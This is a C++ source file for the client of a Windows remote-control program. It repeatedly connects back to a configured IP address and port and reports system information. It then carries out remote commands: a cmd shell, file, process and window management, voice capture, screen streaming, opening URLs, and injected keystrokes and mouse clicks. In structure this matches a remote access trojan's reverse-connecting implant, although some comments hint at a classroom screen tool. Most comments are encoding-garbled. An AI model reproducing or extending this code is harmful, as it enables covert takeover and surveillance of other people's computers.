// MzServer.cpp : Defines the entry point for the application.
//
//��cpp  һģһ�� ȷ��#include <afxwin.h>
#include <afxwin.h> 
#include "stdafx.h"
#include "MzServer.h"

#include "FileOperator.h"
#include <cstdio>
#include "ScreenManage.h"
#include "Process.h"
#include "CmdManage.h"
#include "ConnectInfo.h"
#include "WindowManager.h"
#include "Voice.h"
#include <shellapi.h>
#include "resource3.h"

#include "./zlib.h"
#pragma comment(lib,"./zlib.lib")	//ͼ����������ѹ��ʹ��zlib�⺯��



//�׽��ֵĳ�ʼ��
DWORD __stdcall ConnectThread(LPVOID lparam)
{
	char Buffer[1024 * 100];
	SOCKET MainSocket=socket(AF_INET,SOCK_STREAM,0);
	struct sockaddr_in LocalAddr;
	LocalAddr.sin_family=AF_INET;
	LocalAddr.sin_port=htons(ConnectInfo::getConnectInfo()->port);
	LocalAddr.sin_addr.S_un.S_addr=inet_addr(ConnectInfo::getConnectInfo()->ipAddress); 

	//�������ض�
	if(connect(MainSocket,(PSOCKADDR)&LocalAddr,sizeof(LocalAddr)) == SOCKET_ERROR )
	{
		return 0;
	}
	else
	{

	}
	SysInfo m_SysInfo;
	GetSystemInfo(m_SysInfo);

	MsgHead msgHead;
	msgHead.dwCmd=SOCKET_CONNECT;//�Զ���SOCKET_CONNECTΪһ����ֵ ������ʶ����ϵͳ��Ϣ������
	msgHead.dwSize=sizeof(SysInfo);//SysInfo�������Զ���Ľṹ ������ϵͳ����Ϣ

	if(!SendMsg(MainSocket,(char*)&m_SysInfo,&msgHead))//�Զ��庯���������� ע��sendmsg���Ƕ������2��һ���ַ��� ���Խ��ṹ��ת��Ϊ�ַ�������
	{
		closesocket(MainSocket);
		return 1;
	}
	while(1)
	{
		memset(Buffer, 0, sizeof(Buffer));
		if (!RecvMsg(MainSocket, (char *)Buffer, &msgHead))
		{
			shutdown(MainSocket, 0x02);
			closesocket(MainSocket);//��ʱ���ض��Ǳ߽�����
			break;
		}

		switch(msgHead.dwCmd)
		{
		case CMD_FILEMANAGE:  
			{
				CreateThread(NULL, NULL, FileManageThread, NULL, NULL, NULL);//�����̴߳����ļ�����
				break;
			}
		case CMD_WINDOW_MANAGER_DLG_SHOW:
			{
				CreateThread(NULL, NULL, WindowManagerThread, NULL, NULL, NULL);//�����̴߳����ļ�����
				break;
			}
		case CMD_SCREEN_REQUEST://�յ�����Ļ��������
			{
				DWORD *pDWORD = new DWORD;
				*pDWORD = MainSocket;
				CreateThread(NULL, NULL, ScreenManageThread, pDWORD, NULL, NULL);//�����̴߳�����Ļ����
				break;
			}
		case CMD_CMD_SHELL_REQUEST://�յ���cmd�����д�������
			{
				CreateThread(NULL, NULL, CmdManageThread, NULL, NULL, NULL);//�����̴߳���CMD ���� ����
				break;
			}
		case CMD_PROCESS_MANAGER_DLG_SHOW:
			{
				CreateThread(NULL, NULL, ProcessManagerThread, NULL, NULL, NULL);
				break;
			}
		case CMD_VOICE:
			{
				CreateThread(NULL, NULL, VoiceThread, NULL, NULL, NULL);;
				break;
			}
		case CMD_OPEN_URL:
			{
				ShellExecute(NULL, "open", Buffer, NULL, NULL, SW_SHOWNORMAL);
				break;
			}
		case CMD_MESSAGEBOX:
			{
				char *pChar = new char[1024 * 22];
				memcpy(pChar,(char*)&MainSocket, sizeof(MainSocket));
				memcpy(pChar + sizeof(MainSocket), Buffer, sizeof(MyMessageBox));
				CreateThread(NULL, NULL, MessageBoxThread,pChar, NULL, NULL);
				break;
			}
		case CMD_HEARTBEAT://������
			{
				//���ô������� 
			}
			break;
		case CMD_CTRLALTDEL:// Ctrl + Alt + del
			{

			}
			break;
		case CMD_KEYDOWN://WM_KEYDOWN 
			{
				//	XScreenXor OpenDesktop;
				//	::MessageBox(NULL, "key down", "DD", MB_OK);
				int nVirtKey = msgHead.dwExtend1;
				keybd_event((BYTE)nVirtKey,0,0,0);

			}
			break;
		case CMD_KEYUP://WM_KEYUP
			{
				//XScreenXor OpenDesktop;
				int nVirtKey = msgHead.dwExtend1;
				keybd_event((BYTE)nVirtKey,0,KEYEVENTF_KEYUP,0);
			}
			break;
		case CMD_MOUSEMOVE://WM_MOUSEMOVE
			{
				//XScreenXor OpenDesktop;
				//::MessageBox(NULL, "mouse move", "DD", MB_OK);
				POINT pt;
				pt.x = msgHead.dwExtend1;
				pt.y = msgHead.dwExtend2;
				SetCursorPos(pt.x, pt.y);

			}
			break;
		case CMD_LBUTTONDOWN://WM_LBUTTONDOWN
			{
				//XScreenXor OpenDesktop;
				//::MessageBox(NULL, "LBUTTONDOWN", "DD", MB_OK);
				mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
			}
			break;
		case CMD_LBUTTONUP://WM_LBUTTONUP
			{
				//XScreenXor OpenDesktop;
				mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
			}
			break;
		case CMD_LBUTTONDBLCLK://WM_LBUTTONDBLCLK
			{
				//XScreenXor OpenDesktop;
				mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
				mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
				mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
				mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
			}
			break;
		case CMD_RBUTTONDOWN://WM_RBUTTONDOWN  
			{
				//::MessageBox(NULL, "RBUTTONDOWN", "DD", MB_OK);
				//	XScreenXor OpenDesktop;
				mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
			}
			break;
		case CMD_RBUTTONUP://WM_RBUTTONUP
			{
				//XScreenXor OpenDesktop;
				mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
			}
			break;
		case CMD_RBUTTONDBLCLK://WM_RBUTTONDBLCLK
			{
				//XScreenXor OpenDesktop;
				mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
				mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
				mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
				mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
			}
			break;
		case CMD_SHOW_RECV_SCREEN_DLG :
			{
				IsFirst = TRUE;
				CreateThread(NULL, NULL, OpenDlg, NULL, NULL, NULL);//�����̴߳�����Ļ����
				break;
			}
		case CMD_SCREEN_TO_SERVER:
				getScreenData(MainSocket);
			    pWnd->Invalidate(TRUE);
			break;
		default:
			{
				break;
			}

		}
	}

	return 1;
}



void getScreenData(SOCKET m_MainSocket){
	//����Ϊ��Ļ�Ļ�ȡ�� һֱ��ȡ����ʾ  ֱ�����ղ���  
	MsgHead MsgRecv; 
		if(!RecvData( m_MainSocket, (char *)&MsgRecv, sizeof(MsgHead)))
		{
			closesocket(m_MainSocket);
			m_MainSocket = INVALID_SOCKET;
			return ;
		}
		BITMAPFILEHEADER   bmfHdr; 
		bmfHdr.bfType = 0x4D42;  // "BM"  	// ����λͼ�ļ�ͷ 
		bmfHdr.bfSize = MsgRecv.dwExtend1;
		bmfHdr.bfReserved1 = 0;
		bmfHdr.bfReserved2 = 0;
		bmfHdr.bfOffBits = MsgRecv.dwExtend2;
		m_InfoSize = MsgRecv.dwExtend2 - sizeof(BITMAPFILEHEADER);//m_InfoSizeΪinfo��Ϣͷ�͵�ɫ��Ĵ�С�ĺ�


		int lenthcompress = MsgRecv.dwSize;
		int lenthUncompress = MsgRecv.dwExtend1 - sizeof(BITMAPFILEHEADER);

		if(!RecvData( m_MainSocket,(char *)pCompress,lenthcompress))
		{
			closesocket( m_MainSocket);
		    m_MainSocket = INVALID_SOCKET;
			return ;			    
		}

		IsFirst = pCompress[0];//���ݹ����ĵ�һ���ֽڱ���Ƿ��ǵ�һ֡

		DWORD sz = 2048 * 1536 * 3 * 2;  //���sz��������ֵ  ��Ȼ�����
		if( pChanged == NULL ||  pData == NULL)  // ���ڹر�ʱ�����߳̿����Ծ�����һС��ʱ�� �����pDataΪNULL ���˳��߳� ���򵯳������
		{
			return ;
		}
		if(pCompress == NULL) return ;
		uncompress( pChanged,
			&sz,//ԭʼ����
			pCompress + 1,//+1 ����Ϊ�������ĵ�һ���ֽڲ���ѹ�������� �����Ƿ��ǵ�һ֡���ı�����λ����Ҳ���һ֡��
			lenthcompress);//ѹ���󳤶�
		 m_ChangedOff = 0;
		if( IsFirst)
		{
			memcpy( pData,  pChanged, sz);
		}
		else
		{
			m_ChangedOff =0;
			memcpy( pData,  pChanged,  m_InfoSize); //���µ���Ϣͷ�͵�ɫ�帴�ƽ�data 
			BITMAPINFOHEADER bi;
			memcpy(&bi,  pData, sizeof(bi));//���ļ���Ϣͷ���浽bi

			m_ChangedOff =  m_InfoSize;
			RECT rect;
			memcpy(&rect,  pChanged +  m_ChangedOff, sizeof(rect));//�õ��仯�����ݵķ�Χ 
			m_ChangedOff += sizeof(rect);

			int m_DataOff =  m_InfoSize;
			BYTE *Dst, *Src; 
			int BitSz;
			BitSz = (rect.right - rect.left + 1) * bi.biBitCount / 8;//ÿ����Ҫ���µ�������
			int OneLineByte =  bi.biSizeImage / bi.biHeight;
			for(int i = rect.top; i <= rect.bottom ; i++) 
			{						
				Src =  pChanged +  m_ChangedOff;
				Dst =  pData +  m_InfoSize + i * OneLineByte + rect.left * bi.biBitCount / 8;
				memcpy(Dst, Src, BitSz);//����ÿһ�б仯������
				m_ChangedOff += BitSz;
			}
		}

		//��bitmap����д���ļ���  ����һ��bmpͼ���ļ�
		strcpy(strFilePath,"C://Proj//hehe.bmp");
		HANDLE hFile;
		
		hFile = CreateFile(strFilePath , GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);//����λͼ�ļ�   
		DWORD dwWritten;
		WriteFile(hFile, (LPSTR)&bmfHdr, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);	// д��λͼ�ļ�ͷ
		WriteFile(hFile, (LPSTR)pData, bmfHdr.bfSize, &dwWritten, NULL);// д��λͼ�ļ���������
		CloseHandle(hFile); 	

		//pWnd->Invalidate(TRUE);
		IsFirst = FALSE;
		Sleep(10);
	
}

/*

HWND hwndButton;
HWND hWnd;
HINSTANCE hInst;
TCHAR szWinName[]="MyWin";//��������
TCHAR str[255]="";//����������ַ���
bool isExist;
CWnd *pWnd;
*/
DWORD __stdcall OpenDlg(LPVOID lparam){
	//CWnd* pWnd = new CWnd;	

	//pWnd->CreateEx(WS_EX_CLIENTEDGE, NULL, "��ʦ����Ļ",
	//0, 0, 500, 500, NULL, NULL,NULL);

	//��ʾ���	//����һ��windows��
	if(isExist == true) return 0;
	//::MessageBox(NULL, "dd", "dd", MB_OK);

	WNDCLASSEX wcl;
	wcl.style=CS_HREDRAW|CS_VREDRAW;
	wcl.style&=~CS_VREDRAW;
	wcl.lpfnWndProc=WindowsFunc;
	wcl.cbClsExtra=0;
	wcl.cbWndExtra=0;
	wcl.hInstance=hInst;
	wcl.hIcon=LoadIcon(NULL,IDI_APPLICATION);
	wcl.hIconSm=LoadIcon(NULL,IDI_INFORMATION);
	wcl.hbrBackground=(HBRUSH)GetStockObject(WHITE_BRUSH);
	wcl.hCursor=LoadCursor(NULL,IDC_ARROW);
	wcl.lpszMenuName  = NULL;
	wcl.lpszClassName=szWinName;
	wcl.cbSize=sizeof(WNDCLASSEX);

	//ע���������
	RegisterClassEx(&wcl);
		


	hWnd=CreateWindow(    szWinName,
		"SCREEN",
		WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		HWND_DESKTOP,
		NULL,
		hInst,
		NULL);
	pWnd = CWnd::FromHandle(hWnd);
	ShowWindow(hWnd,SW_SHOWNORMAL);
	UpdateWindow(hWnd);	
	isExist = true;
	MSG msg = { 0 };
	//��Ϣѭ������,��ȡ��Ϣ
	
	while( GetMessage( &msg, NULL, 0, 0 ) )
	{
		
		//�ɷ���Ϣ
		DispatchMessage( &msg );
	}
	return 0;

}


LRESULT CALLBACK WindowsFunc(HWND hWnd,UINT message,WPARAM wParam,LPARAM lParam)
{
	HDC hdc;
	switch (message)
	{
	case WM_CHAR://������Ϣ����
		//hdc=GetDC(hWnd);//����豸������
		//strcpy(str,"            ");
		//TextOut(hdc,1,1,str,strlen(str));//����ԭ���ַ�
		//sprintf(str,"%c",(char)wParam);//���ַ�ת�����ַ���
		//TextOut(hdc,1,1,str,strlen(str));//����ַ�
		//ReleaseDC(hWnd,hdc);//�ͷ��豸������
		break;
	case WM_LBUTTONDOWN:
		//hdc=GetDC(hWnd);//����豸������
		//strcpy(str,"            ");
		//TextOut(hdc,1,1,str,strlen(str));//����ԭ���ַ�
		//sprintf(str,"Mouse");//���ַ�ת�����ַ���
		//TextOut(hdc,1,1,str,strlen(str));//����ַ�
		//ReleaseDC(hWnd,hdc);//�ͷ��豸������
		break;
	case WM_CREATE://���ﴴ��һ����ť������û���õ�ID_BUTTON��
		pData = new BYTE [2048 * 1536 * 3 * 2];//Ϊ�ֱ���2048 * 1536 ��λΪ24λ��3���ֽڵĴ�С�� 2��  
		pChanged = new BYTE [2048 * 1536 * 3 * 2];//Ϊ�ֱ���2048 * 1536 ��λΪ24λ��3���ֽڵĴ�С�� 2��  
		pCompress = new BYTE [2048 * 1536 * 3 * 2];
		m_ScreenBits = 8;	
		break; 
	case WM_COMMAND: //���������Ӧ�����ť��ID_BUTTON�������ڶ����ˣ���������ʱ������ΰ��أ�
		/*switch(LOWORD(wParam))
		{
		case ID_BUTTON:
		MessageBox("hello");
		break; 
		}*/
		break;
	case WM_ERASEBKGND:

		//::MessageBox(NULL, "dd", "dd", MB_OK);
		break;
	case WM_DESTROY://��ֹӦ�ó���
		isExist = false;
		if(pData != NULL) { delete pData; pData = NULL;}
		if(pChanged != NULL) { delete pChanged; pChanged = NULL;}
		if(pCompress != NULL) {delete pCompress;}
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd,message,wParam,lParam);
	}
	return 0;
}



DWORD __stdcall FileManageThread(LPVOID lparam)//�̴߳����ļ�����
{
	MainFileManage();
	return 0;
}

DWORD __stdcall WindowManagerThread(LPVOID lparam)//�̴߳����ļ�����
{
	windowManager();
	return 0;
}

DWORD __stdcall ProcessManagerThread(LPVOID lparam)//�̴߳����ļ�����
{
	processManager();
	return 0;
}

DWORD __stdcall MessageBoxThread(LPVOID lparam)//�̴߳����ļ�����
{
	SOCKET MainSocket;
	memcpy(&MainSocket, (char*)lparam, sizeof(SOCKET));
	MyMessageBox myMessageBox;
	memcpy(&myMessageBox, (char*)lparam + sizeof(SOCKET), sizeof(MyMessageBox));

	if(myMessageBox.category == 2)
		::MessageBox(NULL, myMessageBox.content, myMessageBox.title, MB_OK|MB_ICONERROR);
	else
		::MessageBox(NULL, myMessageBox.content, myMessageBox.title, MB_YESNO);
	delete (char *)lparam;
	return 0;
}


DWORD __stdcall RuningThread(LPVOID lParam)
{
	WSADATA lpWSAData;
	WSAStartup(MAKEWORD(2,2),&lpWSAData);

	while(1)
	{
		HANDLE hThread=NULL;
		hThread = CreateThread(NULL,NULL,ConnectThread,NULL,NULL,NULL);
		WaitForSingleObject(hThread,INFINITE);//INFINTE���޳� ���ȴ�ʱ�����޳� ֻ�е�hThread�߳̽����ż�����������
		CloseHandle(hThread);
		Sleep(10000);
	}

	WSACleanup();
	return 0;
}

int APIENTRY WinMain(HINSTANCE hInstance,
					 HINSTANCE hPrevInstance,
					 LPSTR     lpCmdLine,
					 int       nCmdShow)
{
	// TODO: Place code here.
	hInst=hInstance;// �ݴ�   ���ڴ�������
	isExist = false; //������Ļ���ݵĴ����Ƿ��Ѿ�����
	HANDLE hThread=NULL;
	hThread=CreateThread(NULL,NULL,RuningThread,NULL,NULL,NULL);
	WaitForSingleObject(hThread,INFINITE);//INFINTE���޳� ���ȴ�ʱ�����޳� ֻ�е�hThread�߳̽����ż�����������
	CloseHandle(hThread);

	return 0;
}



